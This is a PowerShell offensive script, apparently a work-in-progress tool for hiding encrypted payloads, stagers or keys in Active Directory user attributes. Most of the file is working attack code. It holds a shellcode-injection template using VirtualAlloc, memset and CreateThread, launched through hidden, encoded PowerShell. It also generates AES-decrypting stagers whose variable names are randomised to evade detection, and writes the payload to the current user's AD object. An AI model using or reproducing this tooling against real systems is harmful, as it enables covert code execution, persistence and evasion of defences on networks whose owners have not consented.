
####TODO Checklist
# Create a seperate stager used to write the AD parameter (Or give the option to write directly from AD from the current machine)
# e.g. If stager is being stored, base64 encode it, store it, and generate PS oneliner to call it.
# If payload is being stored, generate stager to decrypt and execute payload.
# If key is being stored, generate stager to grab key, decrypt, and execute payload.
$script:ADProperty
$script:Storage
$script:custom
$script:customkey
$script:shellcode
$script:key
$script:fullpayload
$script:EncryptedString
$script:EncryptedB64
$script:base64IV
$script:WriteScript
$script:quesWriteScript

function Get-Answers {
	clear
	while (!$script:ADProperty ){
		$script:ADProperty = Read-Host "What AD Property do you want to store into?"
		clear
	}
	
	while (!$script:Storage -or $script:Storage -eq "Invalid"){
	$script:Storage = Read-Host "What do you want to store in the $script:ADProperty property? [Stager,Payload,Key]"
		switch ($script:Storage){
		"Stager"{$script:Storage = "Stager"}
		"Payload" {$script:Storage = "Payload"}
		"Key" {$script:Storage = "Key"}
		default {$script:Storage = "Invalid"}
		}
	clear
	}
	while (!$script:custom -or $script:custom -eq "Invalid"){
		$script:custom = Read-Host "Do you want to use a custom payload?[(Y)es/(N)o]"
		switch ($script:custom){
			"Y" {$script:custom = "True"}
			"Yes" {$script:custom = "True"}
			"N" {$script:custom = "False"}
			"No" {$script:custom = "False"}
			default {$script:custom = "Invalid"}
		}
	clear
	}
	#Todo: Salt the keys?
	while (!$script:customkey -or $script:customKey -eq "Invalid"){
			$script:customKey = Read-Host "Do you want me to generate a random key?[(Y)es/(N)o]"
			switch ($script:customKey){
			"Y" {while(!$script:key){$script:key = Read-Host "Enter your 16, 24, or 32 byte key:"}}
			"Yes" {while(!$script:key){$script:key = Read-Host "Enter your 16, 24, or 32 byte key:"}}
			"N" {$script:Key = Invoke-RandomKey(32)}
			"No" {$script:Key = Invoke-RandomKey(32)}
			default {$script:customKey = "Invalid"}
	
		}
	}
	do {
		if ($script:custom -eq "True"){
			$file = Read-Host "Please enter the filename where your payload is stored"
			$script:fullpayload = Get-Content $file
			Invoke-EncryptPayload ($script:fullpayload)
		}
		elseif ($script:custom -eq "False") {
			$file = Read-Host "Please enter the filename where your shellcode is stored"
			$script:shellcode = Get-Content $file
			$script:fullPayload = "`$shellcode = '`$code = ''[DllImport(`"kernel32.dll`")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(`"kernel32.dll`")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(`"msvcrt.dll`")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';`$winFunc = Add-Type -memberDefinition `$code -Name `"Win32`" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]`$sc64 = $script:Shellcode;[Byte[]]`$sc = `$sc64;`$size = 0x1000;if (`$sc.Length -gt 0x1000) {`$size = `$sc.Length};`$x=`$winFunc::VirtualAlloc(0,0x1000,`$size,0x40);for (`$i=0;`$i -le (`$sc.Length-1);`$i++) {`$winFunc::memset([IntPtr](`$x.ToInt32()+`$i), `$sc[`$i], 1)};`$winFunc::CreateThread(0,0,`$x,0,0,0);for (;;) { Start-sleep 60 };';`$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$shellcode));if(`$env:PROCESSOR_ARCHITECTURE -eq `"AMD64`"){`$powershellx86 = `$env:SystemRoot + `"syswow64WindowsPowerShellv1.0powershell.exe`";`$cmd = `"-noprofile -windowstyle hidden -noninteractive -EncodedCommand`";iex `"& `$powershellx86 `$cmd `$goat`"}else{`$cmd = `"-noprofile -windowstyle hidden -noninteractive -EncodedCommand`";iex `"& powershell `$cmd `$goat`";}"	
			Invoke-EncryptPayload ($script:fullPayload)
		}
	
	} while ( $? -ne $True)
	
		while (!$script:writeScript -or $script:writeScript -eq "Invalid"){
			$script:quesWriteScript = Read-Host "Do you want to write to AD directly from this machine? [(Y)es/(N)o]"
			switch ($script:quesWriteScript){
			"Y" {$script:writeScript = "False"}
			"Yes" {$script:writeScript = "False"}
			"N" {$script:writeScript = "True"}
			"No" {$script:writeScript = "True"}
			default {$script:writeScript = "Invalid"}
	
		}
	}

	Invoke-GenerateStager($script:Storage)
	
	
}

function Invoke-EncryptPayload ($payload){
	$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
	$utf8 = new-object -TypeName System.Text.UTF8Encoding
	$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
	$aesManaged.BlockSize = 128
	$aesManaged.KeySize = 256
	$aesManaged.Key = $utf8.GetBytes($script:key)
	Write-Host "Encrypting payload with key: $script:key"
	$encryptor = $aesManaged.CreateEncryptor()
	$script:encryptedString = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
	$StageIV = $aesManaged.IV
	$script:EncryptedB64 = [System.Convert]::ToBase64String($script:encryptedString)
	$script:Base64IV = [System.Convert]::ToBase64String($StageIV)
	Write-Host "Encrypted Data: $script:encryptedb64"
	$aesManaged.Dispose()
}

function Invoke-RandomKey ($length) {
	$ascii=$NULL;For ($a=33;$a -le 126;$a++) {$ascii+=,[char][byte]$a }
	For ($loop=1; $loop -le $length; $loop++) {
            $TempPassword+=($ascii | GET-RANDOM)
        }
	return $TempPassword
}

function Invoke-WritePayloadToAD ($payload) {
	$global:username = [Environment]::UserName
	#Write String to AD
	$AD = ([adsisearcher]"(samaccountname=$global:username)").FindOne().GetDirectoryEntry()
	$AD.Put($script:ADProperty, $script:EncryptedB64)
	$AD.SetInfo()
	#ReadString from AD
	#$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname
	#$Domain = $ENV:USERDNSDOMAIN
	#$DC = ([ADSI]'LDAP://RootDSE')
	#$DN = "DC=$($Domain.Replace('.', ',DC='))"
	#$SearchString = "LDAP://$DomainController/$DN"
	#$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	#$Searcher.Filter = "(samaccountname=$global:username)"
	#$User = $Searcher.FindOne()
	#$testString = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])
}

function Invoke-GenerateStager ($StagerType) {
	$varAESManaged = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varUnencryptedData = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varEncryptedB64 = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varEncryptedB64IV = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varUTF8 = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varIV = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varKey = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varBytes = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varHash = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varDecryptor = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	
	
	
	switch($script:Storage) 
	{
		"Stager" {<#Needs to pull encrypted payload from somewhere#>
			$keylocation = Read-Host "Provide the full path to where the key will be stored"
			$Stager += "`$$varEncryptedB64 = '$script:EncryptedB64'`n"
			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UTF8Encoding`n"
			$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
			$Stager += "`$$varKey = Read-Host 'you know what I need'"	#How do we wanna provide the key? Pipeline? Read-Host?
			$Stager += "`$$varaesManaged = New-Object 'System.Security.Cryptography.AesManaged'`n"
			$Stager += "`$$varaesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC`n"
			$Stager += "`$$varaesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros`n"
			$Stager += "`$$varaesManaged.BlockSize = 128`n"
			$Stager += "`$$varaesManaged.KeySize = 256`n"
			$Stager += "`$$varaesManaged.IV = `$$varIV`n"
			$Stager += "`$$varaesManaged.Key = `$$varUTF8.GetBytes(`$$varKey)`n"
			$Stager += "`$$varBytes = [System.Convert]::FromBase64String(`$$varEncryptedB64)`n"
			$Stager += "`$$varDecryptor = `$$varaesManaged.CreateDecryptor()`n"
			$Stager += "`$$varunencryptedData = `$$vardecryptor.TransformFinalBlock(`$$varBytes, 0, `$$varBytes.Length)`n"	
			$Stager += "`$$varunencryptedData = [System.Text.Encoding]::UTF8.GetString(`$$varunencryptedData).Trim([char]0)`n"
			$Stager += "`$$varunencrypteddata | powershell.exe -w hidden`n"
			$Stager += "`$$varAESManaged.Dispose()`n"
			#Invoke-WritePayloadToAD($Stager)	
			Write-Host "To invoke run the following Powershell One-Liner:`n`$DomainController= ([ADSI]'LDAP://RootDSE').dnshostname;`$Domain=`$ENV:USERDNSDOMAIN;`$DC=([ADSI]'LDAP://RootDSE');`$DN=`"DC=`$(`$Domain.Replace('.', ',DC='))`";`$SearchString =  `"LDAP://DomainController/`$DN`";`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]`$SearchString)`$Searcher.Filter = `"(samaccountname=$global:username);`$User= `$Searcher.FindOne();[System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0]);"
			#Todo: Generate oneliner to call and execute stager
		}
		"Payload" {
			#$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
			#$Stager += "`$Domain = `$ENV:USERDNSDOMAIN`n"
			#$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
			#$Stager += "`$DN = `"DC=`$($Domain.Replace('.', ',DC='))`"`n"
			#$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
			#$Stager += "`Searcher = New-Object System.DirectoryServices.DirectorySearch([ADSI]`$SearchString)`n"
			#$Stager += "`$Searcher.Filter =`"(samaccountname=$global:username)`n`""
			$Stager += "`$$varEncryptedB64 = [System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0])`n"
			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UTF8Encoding`n"
			$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
			$Stager += "`$$varKey = Read-Host 'you know what I need'"	#How do we wanna provide the key? Pipeline? Read-Host?
			$Stager += "`$$varaesManaged = New-Object 'System.Security.Cryptography.AesManaged'`n"
			$Stager += "`$$varaesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC`n"
			$Stager += "`$$varaesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros`n"
			$Stager += "`$$varaesManaged.BlockSize = 128`n"
			$Stager += "`$$varaesManaged.KeySize = 256`n"
			$Stager += "`$$varaesManaged.IV = `$$varIV`n"
			$Stager += "`$$varaesManaged.Key = `$$varUTF8.GetBytes(`$$varKey)`n"
			$Stager += "`$$varBytes = [System.Convert]::FromBase64String(`$$varEncryptedB64)`n"
			$Stager += "`$$varDecryptor = `$$varaesManaged.CreateDecryptor()`n"
			$Stager += "`$$varunencryptedData = `$$vardecryptor.TransformFinalBlock(`$$varBytes, 0, `$$varBytes.Length)`n"	
			$Stager += "`$$varunencryptedData = [System.Text.Encoding]::UTF8.GetString(`$$varunencryptedData).Trim([char]0)`n"
			$Stager += "`$$varunencrypteddata | powershell.exe -w hidden`n"
			$Stager += "`$$varAESManaged.Dispose()`n"
			$Stager | Out-File stager.ps1
			Write-Host Encrypted String:`n$script:EncryptedString
			#Invoke-WritePayloadToAD($script:EncryptedString)
		}
		"Key" {
			#$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
			#$Stager += "`$Domain = `$ENV:USERDNSDOMAIN`n"
			#$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
			#$Stager += "`$DN = `"DC=`$($Domain.Replace('.', ',DC='))`"`n"
			#$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
			#$Stager += "`Searcher = New-Object System.DirectoryServices.DirectorySearch([ADSI]`$SearchString)`n"
			#$Stager += "`$Searcher.Filter =`"(samaccountname=$global:username)`n`""
			$Stager += "`$$varKey = [System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0])`n"
			$Stager += "`$$varEncryptedB64 = '$script:EncryptedB64'`n"
			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UTF8Encoding`n"
			$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
			$Stager += "`$$varaesManaged = New-Object 'System.Security.Cryptography.AesManaged'`n"
			$Stager += "`$$varaesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC`n"
			$Stager += "`$$varaesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros`n"
			$Stager += "`$$varaesManaged.BlockSize = 128`n"
			$Stager += "`$$varaesManaged.KeySize = 256`n"
			$Stager += "`$$varaesManaged.IV = `$$varIV`n"
			$Stager += "`$$varaesManaged.Key = `$$varUTF8.GetBytes(`$$varKey)`n"
			$Stager += "`$$varBytes = [System.Convert]::FromBase64String(`$$varEncryptedB64)`n"
			$Stager += "`$$varDecryptor = `$$varaesManaged.CreateDecryptor()`n"
			$Stager += "`$$varunencryptedData = `$$vardecryptor.TransformFinalBlock(`$$varBytes, 0, `$$varBytes.Length)`n"	
			$Stager += "`$$varunencryptedData = [System.Text.Encoding]::UTF8.GetString(`$$varunencryptedData).Trim([char]0)`n"
			$Stager += "`$$varunencrypteddata | powershell.exe -w hidden`n"
			$Stager += "`$$varAESManaged.Dispose()`n"
			$Stager | Out-File stager.ps1
			Write-Host Encrypted String:`n$script:EncryptedString
			#Invoke-WritePayloadToAD($script:EncryptedString)
		}
		default {"Incorrect Storage type chosen"}
	}

}

Get-Answers
#Invoke-WritePayloadToAD

	
	
	
	
	#Write-Host "`n`n`nDEBUGGING - Decrypting Payload to make sure the process worked correctly"
	#$utf8 = new-object -TypeName System.Text.UTF8Encoding
	#$aesManaged2 = New-Object "System.Security.Cryptography.AesManaged"
	#$aesManaged2.Mode = [System.Security.Cryptography.CipherMode]::CBC
	#$aesManaged2.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
	#$aesManaged2.BlockSize = 128
	#$aesManaged2.KeySize = 256
	#$aesManaged2.Key = $utf8.GetBytes($script:key)
	#$aesManaged2.IV = [System.Convert]::FromBase64String($script:Base64IV)
	#$encString = [System.Convert]::FromBase64String($TestString)
	#$decryptor = $aesmanaged2.CreateDecryptor()
	#$varunencryptedData = $decryptor.TransformFinalBlock($encString, 0, $encstring.Length)
	#$varunencryptedData = [System.Text.Encoding]::UTF8.GetString($varunencryptedData).Trim([char]0)
	#Write-Host $varunencryptedData

